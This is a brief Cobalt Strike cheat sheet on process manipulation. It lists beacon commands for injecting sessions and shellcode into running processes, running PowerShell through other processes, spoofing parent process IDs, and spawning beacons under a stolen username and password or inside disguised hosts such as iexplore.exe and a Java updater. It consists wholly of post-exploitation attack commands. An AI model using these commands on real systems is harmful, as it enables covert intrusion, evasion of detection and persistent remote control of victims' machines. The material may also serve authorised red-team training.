# 05 - Process Manipulation

Search Tag: #cobalt-strike #command-and-control

## 5.1 - Inject Process

* Inject to spawn beacon session

`beacon> inject <pid> <architecture> <listener>`

* Run powershell through another process

`beacon> psinject <pid> <arch> <cmdlet> [args]`

## 5.2 - Inject Shellcode

* Inject shellcode

`beacon> shinject <pid> /path/to/shellcode.bin`

* Spawn shellcode and tunnel

`beacon> spunnel <pid> /path/to/shellcode.bin`

## 5.3 - Spoof Process

* Spoof a parent process that is ready to spawn a new child process

`beacon> ppid <ppid>`

## 5.4 - Spawn Beacon Session

`beacon> spawnas <username> <password>`

`beacon> spawnto <arch> <path> <args>`

`beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`

`beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe`

`beacon> spawn <arch> <listener>`